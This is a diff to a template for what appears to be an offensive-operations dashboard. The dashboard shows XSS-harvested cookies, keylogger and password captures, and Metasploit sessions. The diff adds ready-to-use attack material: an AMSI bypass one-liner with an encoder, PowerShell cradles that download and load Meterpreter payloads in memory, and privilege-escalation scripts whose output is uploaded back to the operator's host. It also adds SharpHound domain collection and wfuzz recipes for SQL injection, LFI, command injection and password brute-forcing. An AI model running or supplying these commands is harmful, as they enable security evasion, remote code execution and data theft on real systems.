@@ -12,6 +12,8 @@
 {% block scripts %}
 
 {{super()}}
+
+<script src="{{url_for('static', filename='js/amsi.fail.js')}}"></script>
 <script src="{{url_for('static', filename='js/asciinema-player.min.js')}}"></script>
 <script src="{{url_for('static', filename='js/incompetentbastard.js')}}"></script>
 
@@ -36,9 +38,9 @@ uitloggen
 
 
 
- 	<li {{'tab0' | zet_pill(cms_pag) | safe}}><a href="#tab0" data-toggle="tab">Dashboard</a>
+  <li {{'tab0' | zet_pill(cms_pag) | safe}}><a href="#tab0" data-toggle="tab">Dashboard</a>
 
-		{% if template: %}
+    {% if template: %}
       <li {{'tab1' | zet_pill(cms_pag) | safe}}><a href="#tab1" data-toggle="tab">Findings</a>
       </li> {% else %} Create findings!  {% endif %}
       <li><a href="#tab2" data-toggle="tab">Notes</a>
@@ -61,6 +63,9 @@ uitloggen
     <a class="dropdown-toggle" data-toggle="dropdown" href="#">WEB
     <span class="caret"></span></a>
     <ul class="dropdown-menu">
+      <li><a href="#tab3" data-toggle="tab"> Overview</a></li>
+<li class="divider"></li>
+
  {% if cookies or keylogger or localstorage or wachtwoorden: %}
        <li role="presentation" class="dropdown-header">XXS results</li>
        {% endif %}
@@ -75,10 +80,13 @@ uitloggen
       <li><a href="#tab6" data-toggle="tab">Password</a>
       </li>{% endif %}
            <li class="divider"></li>
-         <li><a href="https://bitvijays.github.io/LFC-VulnerableMachines.html" target="_blank">Custom XSS</a></li>
-         <li><a href="https://bitvijays.github.io/LFC-VulnerableMachines.html" target="_blank">Custom XXE</a></li>
-         <li><a href="https://bitvijays.github.io/LFC-VulnerableMachines.html" target="_blank">Custom CSRF</a></li>
-         <li><a href="https://bitvijays.github.io/LFC-VulnerableMachines.html" target="_blank">Custom SSRF</a></li>
+         <li><a href="/dashboard" target="_blank">Custom HTA</a></li>
+         <li><a href="/dashboard" target="_blank">Custom SCT</a></li>
+         <li><a href="/dashboard" target="_blank">Custom CPROJ</a></li>
+         <li><a href="/dashboard" target="_blank">Custom XSS</a></li>
+         <li><a href="/dashboard" target="_blank">Custom XXE</a></li>
+         <li><a href="/dashboard" target="_blank">Custom CSRF</a></li>
+         <li><a href="/dashboard" target="_blank">Custom SSRF</a></li>
     </ul>
   </li>
   <li class="dropdown">
@@ -86,6 +94,8 @@ uitloggen
     <span class="caret"></span></a>
     <ul class="dropdown-menu">
       <li><a href="#tab8" data-toggle="tab">Shells & Payloads</a>
+        <li><a href="#tab8b" data-toggle="tab">LOLBAS</a>
+          <li><a href="#tab8c" data-toggle="tab">Pivotting</a>
       <li><a href="#tab9" data-toggle="tab">Commands</a></li>
         <li><a href="#tab10" data-toggle="tab">Rubeus and Mimikatz</a></li>
         <li><a href="#tab11" data-toggle="tab">Enummeration WEB</a></li>
@@ -131,10 +141,10 @@ We have {{aantalhooked}} hits on xxs.js
 
 
 <h4>Available screens</h4>
-<pre>{{screens}}
+<pre id="pollscreens">{{screens}}
 </pre>
 <h4>Available MSF sessions</h4>
-<pre>
+<pre id="pollsessions">
 sessions
 </pre>
 
@@ -144,19 +154,19 @@ sessions
 <pre>{{x | inhoudweergeven}}</pre>
 
 {% endfor %}
-</div>		
+</div>    
 </div>
 {% if template: %}
 <div class="tab-pane fade {{'tab1' | zet_actief(cms_pag)}}" id="tab1">
 <a class="btn btn-success pull-right" href="/dashboard/findings/rapport" target="_blank">Generate rapport</a>
 <h1>Findings</h1>
 
-<p>WEB MOBIEL INTERNAL</p>
+<p><span class="webtoggle">WEB</span> MOBIEL INTERNAL</p>
 
 <hr />
 {% for x in template: %}
-<h4 title="{{x.enbeschrijving}}">{{x.titel}}</h4>
-<ul>
+<h4 class="{{x.bevtype}}" title="{{x.enbeschrijving}}">{{x.titel}}</h4>
+<ul class="{{x.bevtype}}">
 {{ x.id | bevindingen_halen(bevindingen) | safe}}
 
 
@@ -264,13 +274,23 @@ Set-ItemProperty -Path 'hkcu:\Environment' -Name Tmp -Value $CurrTmp
 Set-ItemProperty -Path 'hkcu:\Environment' -Name Temp -Value $CurrTemp       
 </pre>
 
+<p><strong>OffSec</strong></p>
+<pre>$a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like "*Context") {$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf = @(0);[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1);</pre>
+
+<p><strong>Amsi.fail  <span class="amsi-method">Basic bypass</span></strong></p>
+
+<textarea cols="50" id="PowerShellOut" rows="10">$a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like "*Context") {$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf = @(0);[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1);</textarea><br>
+<button class="custom-button custom-button-primary" onclick="GeneratePS()">Generate</button>
+<button class="custom-button custom-button-primary" onclick="GenerateEncPS()">Generate Encoded</button>
+
+
 <p>InviShell user.bat</p>
 
 <pre>curl {{appdata.localhost}}/tools/invisi.dll -o c:\windows\tasks\invisi.dll & curl {{appdata.localhost}}/tools/user.bat -o c:\windows\tasks\user.bat & c:\windows\tasks\user.bat</pre>
 
 <p>InviShell admin.bat</p>
 
-<pre>curl {{appdata.localhost}}/tools/invisi.dll -o c:\windows\tasks\invisi.dll & curl {{appdata.localhost}}/tools/user.bat -o c:\windows\tasks\user.bat & c:\windows\tasks\user.bat</pre>
+<pre>curl {{appdata.localhost}}/tools/invisi.dll -o c:\windows\tasks\invisi.dll & curl {{appdata.localhost}}/tools/admin.bat -o c:\windows\tasks\user.bat & c:\windows\tasks\admin.bat</pre>
 
 
 <p>PsBypassCLM.exe</p>
@@ -291,10 +311,20 @@ Set-ItemProperty -Path 'hkcu:\Environment' -Name Temp -Value $CurrTemp
 
 <h4>Basic Privesc</h4>
 <p>PowerUp.ps1</p>
-<pre>powershell -exec Bypass -C "IEX (New-Object Net.WebClient).DownloadString('{{appdata.localhost}}/tools/PowerUp.ps1');Invoke-AllChecks> PowerUp_$(iex hostname);curl.exe -F file=@PowerUp_$(iex hostname) {{appdata.localhost}}/upload/"</pre>
+<pre>powershell -exec Bypass -C "IEX (New-Object Net.WebClient).DownloadString('{{appdata.localhost}}/tools/PowerUp.ps1');Invoke-AllChecks > PowerUp_$(iex hostname);curl.exe -F file=@PowerUp_$(iex hostname) {{appdata.localhost}}/upload/"</pre>
+<p>PowerUp.ps1 encoded</p>
+
+
+<pre>powershell -e {{ "IEX (New-Object Net.WebClient).DownloadString('[host]/tools/PowerUp.ps1');Invoke-AllChecks > PowerUp_$(iex hostname);curl.exe -F file=@PowerUp_$(iex hostname) [host]/upload/" | winbas64}}</pre>
+
+
 
 <p>PrivescCheck.ps1</p>
 <pre>IEX ((New-Object Net.WebClient).DownloadString('{{appdata.localhost}}/tools/PrivescCheck.ps1'));Invoke-PrivescCheck -Extended -Report PrivescCheck_$(iex hostname);curl.exe -F file=@PrivescCheck_$(iex hostname).txt {{appdata.localhost}}/upload/</pre>
+<p>PrivescCheck.ps1 encoded</p>
+
+
+<pre>powershell -e {{ "IEX ((New-Object Net.WebClient).DownloadString('[host]/tools/PrivescCheck.ps1'));Invoke-PrivescCheck -Extended -Report PrivescCheck_$(iex hostname);curl.exe -F file=@PrivescCheck_$(iex hostname).txt [host]/upload/" | winbas64}}</pre>
 
 <p>SNMPTRAP</p>
 <pre>
@@ -337,9 +367,9 @@ powershell.exe iex "(iwr http://{{appdata.localhost}}/tools/Invoke-PowerShellTcp
 
 <p>Check <code>nltest /domain_trusts</code> for domains</p>
 
-<pre>curl {{appdata.localhost}}/tools/SharpHound.exe -o c:\windows\tasks\SharpHound.exe & c:\windows\tasks\SharpHound.exe --CollectionMethods All,GPOLocalGroup --searchforest --OutputPrefix "Forest"; </pre>
+<pre>curl {{appdata.localhost}}/tools/SharpHound.exe -o c:\windows\tasks\SharpHound.exe & c:\windows\tasks\SharpHound.exe --CollectionMethods All,GPOLocalGroup --searchforest --OutputPrefix "Forest" </pre>
 
-<pre>curl {{appdata.localhost}}/tools/SharpHound.exe -o c:\windows\tasks\SharpHound.exe & c:\windows\tasks\SharpHound.exe --CollectionMethods All,GPOLocalGroup --OutputPrefix "Domain"; </pre>
+<pre>curl {{appdata.localhost}}/tools/SharpHound.exe -o c:\windows\tasks\SharpHound.exe & c:\windows\tasks\SharpHound.exe --CollectionMethods All,GPOLocalGroup --OutputPrefix "Domain" </pre>
 
 
 <p>SharpHound AMSI bypass</p>
@@ -359,11 +389,21 @@ powershell.exe iex "(iwr http://{{appdata.localhost}}/tools/Invoke-PowerShellTcp
 <p>Powershell encoded</p>
 <pre>powershell -e {{ "$data = (New-Object System.Net.WebClient).DownloadData('[host]/payloads/methtcp.exe');$assem = [System.Reflection.Assembly]::Load($data);[meth.Program]::Main(1)" | winbas64}}</pre>
 
+<p>Basic injection generic</p>
+<textarea cols="50" id="basic_out" data="$data = (New-Object System.Net.WebClient).DownloadData('{{appdata.localhost}}/payloads/methtcp.exe');$assem = [System.Reflection.Assembly]::Load($data);[meth.Program]::Main(1)" rows="10"></textarea><br>
+<button class="custom-button custom-button-primary" onclick="Generate_out()">Generate</button><button class="custom-button custom-button-primary" onclick="Generate_outenc()">Generate enc</button>
+
+
+
 <p>Basic injection Meterpreter port 8080</p>
 <pre>$data = (New-Object System.Net.WebClient).DownloadData('{{appdata.localhost}}/payloads/meth8080.exe');$assem = [System.Reflection.Assembly]::Load($data);[meth.Program]::Main(1)</pre>
 
 <p>Powershell encoded Meterpreter port 8080</p>
 <pre>powershell -e {{ "$data = (New-Object System.Net.WebClient).DownloadData('[host]/payloads/meth8080.exe');$assem = [System.Reflection.Assembly]::Load($data);[meth.Program]::Main(1)" | winbas64}}</pre>
+
+<p>Basic injection Meterpreter port 8080 generic</p>
+<textarea cols="50" id="meter_out" data="$data = (New-Object System.Net.WebClient).DownloadData('{{appdata.localhost}}/payloads/meth8080.exe');$assem = [System.Reflection.Assembly]::Load($data);[meth.Program]::Main(1)"rows="10"></textarea><br>
+<button class="custom-button custom-button-primary" onclick="Generate_meter()">Generate</button><button class="custom-button custom-button-primary" onclick="Generate_meterenc()">Generate enc</button>
 
 
 
@@ -371,6 +411,46 @@ powershell.exe iex "(iwr http://{{appdata.localhost}}/tools/Invoke-PowerShellTcp
 <pre>
 {{shells}}
 </pre>
+</div>
+<div class="tab-pane fade" id="tab8c">
+    <h1>PIVOTS</h1>
+
+</div>
+<div class="tab-pane fade" id="tab8b">
+  <h1>LOLBAS</h1>
+
+<p>sct</p>
+
+<p>sct</p>
+
+<p>hta</p>
+
+
+<p>hta</p>
+
+
+<p>hta</p>
+
+
+<p>hta</p>
+
+
+<p>hta</p>
+
+
+<p>hta</p>
+
+
+<p>hta</p>
+
+
+<p>hta</p>
+
+
+
+
+
+
 </div>
 <div class="tab-pane fade" id="tab9">
 <h1>Commands</h1>
@@ -390,38 +470,77 @@ powershell.exe iex "(iwr http://{{appdata.localhost}}/tools/Invoke-PowerShellTcp
 
 <div class="tab-pane fade" id="tab11">
 <h1>Enummeration WEB</h1>
-<p>Constrained language</p>
+<pre>apt install payloadsallthethings hakrawler seclists</pre>
+<p>Basic settings</p>
+<pre>
+export SCANURL="http://target:80"
+</pre>
+<h4>SSTI</h4>
+<pre>{{'{{2*21}}'}}
+${2*21}
+<%= 2*21 %>
+${{'{{2*21}}'}}
+#{2*21}</pre>
+<h4>Wfuzz</h4>
 
-<pre></pre>
+<p>Directory discovery</p>
+<pre>wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt --hc 404,301 "$SCANURL/FUZZ/"</pre>
+
+<p>Authenticated directory discovery</p>
+<pre>wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt --hc 404 -b "PARAM=value" "$SCANURL/FUZZ/"</pre>
+
+<p>File discovery</p>
+<pre>wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/raft-large-files.txt --hc 301,404 "$SCANURL/FUZZ"</pre>
+
+<p>Authenticated file fuzzing</p>
+<pre>wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/raft-large-files.txt --hc 301,404,403 -b "PARAM=value" "$SCANURL/FUZZ"</pre>
+
+<p>Parameter discovery</p>
+<pre>wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt --hc 404,301 "$SCANURL/FUZZ=data"</pre>
+
+<p>GET parameter values</p>
+<pre>wfuzz -c -z file,/usr/share/seclists/Usernames/cirt-default-usernames.txt --hc 404,301 "$SCANURL/index.php?parameter=FUZZ"</pre>
+
+<p>html_escape fuzzing</p>
+<pre>wfuzz -c -z file,/usr/share/wordlists/Fuzzing/yeah.txt "$SCANURL/FUZZ"</pre>
+
+<p>XSS</p>
+<pre>wfuzz -c -z file,/usr/share/seclists/Fuzzing/XSS/XSS-Jhaddix.txt --hh 0 "$SCANURL/index.php?id=FUZZ"</pre>
+<p>Fuzzing GET parameter</p>
+<pre>wfuzz -c -z file,/usr/share/wordlists/wfuzz/Injections/SQL.txt -u "$SCANURL/index.php?id=FUZZ"</pre>
+
+<p>Fuzzing POST parameter</p>
+<pre>wfuzz -c -z file,/usr/share/wordlists/wfuzz/Injections/SQL.txt -d "id=FUZZ" -u "$SCANURL/index.php"</pre>
+<p>LFI</p>
+<pre>wfuzz -c -z file,/usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt --hh 0 "$SCANURL/index.php?id=FUZZ"</pre>
+
+<p>command injection</p> 
+<pre>wfuzz -c -z file,"/usr/share/payloadsallthethings/Command Injection/Intruder/command-execution-unix.txt" --sc 200 "$SCANURL/index.php?parameter=idFUZZ"</pre>
+
+<p>Static file IDOR</p> 
+<pre>wfuzz -c -z range,1-100 --hc 404 "$SCANURL/index.php?doc=FUZZ.txt"</pre>
+<p>ID based IDOR </p>
+<pre>wfuzz -c -z range,1-100 --hc 404 "$SCANURL/index.php?doc=FUZZ"</pre>
+
+<p>Users discovery</p>
+<pre>wfuzz -c -z file,/usr/share/seclists/Usernames/top-username-shortlist.txt --hc 404,403 "$SCANURL/login.php?user=FUZZ"</pre>
+<p>Password discovery</p>
+<pre>wfuzz -c -z file,/usr/share/seclists/Passwords/xato-net-10-million-passwords-100000.txt --hc 404,403 -d "username=admin&password=FUZZ" "$SCANURL/login.php"</pre>
 
 
-{% for x in logs %}
+<h4>Gobuster</h4>
 
-{{x}}
+<p>Endpoint discovery</p>
+<pre>gobuster dir -u $SCANURL -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt</pre>
 
-{% endfor %}
+<p>Subdomain discovery</p>
+<pre>gobuster dns -d $SCANURL -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt</pre>
 
-
-<h4>Basic Privesc</h4>
-
-
-
-<h4>Privesc</h4>
-
-
-<h4>Remoting</h4>
-
-<p></p>
-
-<pre>Invoke-Command -ComputerName dcorp-dc -ScriptBlock { Get-ChildItem C:\ } -credential $credential</pre>
-
-
-
-
-
-
-
-
+<h4>Hakrawler</h4>
+<pre>
+echo "$SCANURL" > urls.txt
+cat urls.txt | hakrawler
+</pre>
 
 
 </div>
